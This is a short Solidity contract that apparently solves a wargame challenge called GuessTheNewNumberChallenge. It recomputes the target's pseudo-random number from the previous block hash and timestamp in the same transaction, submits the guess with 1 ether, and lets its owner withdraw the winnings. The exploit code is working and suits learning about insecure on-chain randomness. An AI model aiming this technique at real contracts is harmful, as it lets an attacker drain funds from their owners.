pragma solidity ^0.4.21;

import "./GuessTheNewNumberChallenge.sol";


contract GuessTheNewNumberSolver {
    address owner;

    function GuessTheNewNumberSolver() public {
        owner = msg.sender;
    }

    function () public payable {}

    function guess(address _challenge) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(_challenge);
        challenge.guess.value(msg.value)(answer);
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
